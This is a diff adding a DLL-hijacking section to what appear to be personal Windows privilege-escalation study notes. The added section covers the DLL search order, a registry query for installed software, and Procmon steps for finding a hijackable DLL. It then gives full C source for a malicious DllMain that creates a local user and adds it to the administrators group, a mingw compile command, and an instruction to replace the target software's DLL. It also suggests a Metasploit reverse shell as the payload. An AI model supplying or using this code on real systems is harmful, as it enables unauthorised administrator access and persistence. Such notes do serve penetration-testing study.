@@ -100,6 +100,56 @@
 //being in the Administrators group doesn't give you an elevated token by default
 `Start-Process powershell -Verb RunAs`
 
+#### dll Hijacking
+//DLLs  standard search order
+```
+1. The directory from which the application loaded.
+2. The system directory.
+3. The 16-bit system directory.
+4. The Windows directory. 
+5. The current directory.
+6. The directories that are listed in the PATH environment variable.
+```
+//check the software
+`Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
+
+//check the write privi to the path of  target software
+
+//use Procmon64.exe to check which dll was loaded when some operations happened
+//use "Process Name" to filter and add the software first, then, use path filter the xxx.dll which is vulned to hijack, literally from a CVE.
+//replace the dll by malicious one, could be a msf rev shell.
+// for this case , use cpp file, add a user into admin grp
+```
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave3 password123! /add");
+  	    i = system ("net localgroup administrators xxx /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+compile it 
+`x86_64-w64-mingw32-gcc xxx.cpp --shared -o xxx.dll`
+
+//replace the dll in the path of softw.
+
   #### Windows Privileges - SeBackup / SeRestore
     whoami /priv
       SeBackupPrivilege             Back up files and directories  Disabled
